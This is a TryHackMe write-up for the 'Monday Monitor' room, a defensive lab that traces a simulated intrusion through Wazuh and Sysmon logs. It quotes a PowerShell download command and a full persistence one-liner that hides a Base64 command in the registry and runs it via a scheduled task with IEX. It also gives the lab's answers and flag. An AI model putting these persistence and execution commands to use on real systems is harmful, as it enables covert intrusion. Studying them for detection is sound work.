# Monday Monitor - TryHackMe Write-up

## Objective

The objective of this room is to investigate endpoint logs collected by Wazuh and Sysmon to identify suspicious activities performed by an attacker. The investigation focuses on discovering how the attacker gained access, established persistence, created accounts, dumped credentials, and exfiltrated data.

---

# Task 1 - Navigate Through the Endpoint Logs

After accessing the Wazuh dashboard, the saved query **Monday_Monitor** was loaded. All investigations were performed by reviewing Sysmon and Windows event logs generated on the compromised endpoint.

---

## Question 1
### Initial access was established using a downloaded file. What is the file name saved on the host?

### Investigation

To identify the initial access vector, I searched for PowerShell execution events and download-related activities. Reviewing Sysmon Process Creation logs revealed a PowerShell command using `Invoke-WebRequest`.

The command contained:

```powershell
Invoke-WebRequest -Uri $url -OutFile $env:TEMP\SwiftSpend_Financial_Expenses.xlsm
```

The `-OutFile` parameter specifies the downloaded file name.

### Answer

```
SwiftSpend_Financial_Expenses.xlsm
```

## Question 2
### What is the full command run to create a scheduled task?

### Investigation

To investigate persistence mechanisms, I searched for events involving `schtasks.exe`.

A Sysmon Event ID 1 (Process Creation) log showed a command creating a scheduled task while also adding a registry value.

The complete command was copied directly from the event details.

### Answer

```cmd
cmd.exe /c reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0= /f & schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\ATOMIC-T1053.005).test)))" /sc daily /st 12:34
```

## Question 3
### What time is the scheduled task meant to run?

### Investigation

The scheduled task command identified in the previous step contained the parameter:

```cmd
/st 12:34
```

The `/st` option specifies the scheduled execution time.

### Answer

```
12:34
```

## Question 4
### What was encoded?

### Investigation

The registry value added by the attacker contained a Base64 encoded string:

```text
cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0=
```

Using CyberChef and Base64 decoding, the string translated to:

```text
ping www.youarevulnerable.thm
```

### Answer

```
ping www.youarevulnerable.thm
```

## Question 5
### What password was set for the new user account?

### Investigation

To identify account creation activity, I filtered logs related to user account management.

Windows Security events showed a new account being created followed by account modification commands. Reviewing the command-line arguments revealed the password assigned to the account.

### Answer

```
I_AM_M0NIT0R1NG
```

## Question 6
### What is the name of the .exe that was used to dump credentials?

### Investigation

Credential dumping tools typically attempt to access LSASS memory. I reviewed process creation logs for suspicious executables.

One process stood out due to its unusual name and behavior:

```text
memotech.exe
```

The executable was responsible for credential dumping activity.

### Answer

```
memotech.exe
```

## Question 7
### Data was exfiltrated from the host. What was the flag that was part of the data?

### Investigation

To identify exfiltration activity, I searched for outbound PowerShell commands and suspicious network connections.

Reviewing the PowerShell command contents revealed data being transmitted externally. Within the transmitted data, the following flag was discovered.

### Answer

```
THM{M0N1T0R_1$_1N_3FF3CT}
```

# Attack Timeline

1. Attacker downloaded a malicious XLSM file.
2. PowerShell executed the payload.
3. Registry keys were created to store encoded commands.
4. A scheduled task was created for persistence.
5. A new user account was created and configured.
6. Credentials were dumped using `memotech.exe`.
7. Sensitive information was exfiltrated from the system.

---

# Skills Learned

- Wazuh Dashboard Navigation
- Sysmon Event Analysis
- Windows Security Log Investigation
- Threat Hunting
- PowerShell Analysis
- Persistence Detection
- Credential Dumping Detection
- Incident Response Workflow
- MITRE ATT&CK Mapping

---

# Conclusion

This room provided hands-on experience with endpoint monitoring and log analysis using Wazuh and Sysmon. By investigating process creation events, registry modifications, account management activities, and PowerShell execution logs, it was possible to reconstruct the complete attack chain from initial access through data exfiltration.

The exercise demonstrated how SOC analysts use endpoint telemetry to identify attacker behavior, investigate incidents, and map activities to MITRE ATT&CK techniques.
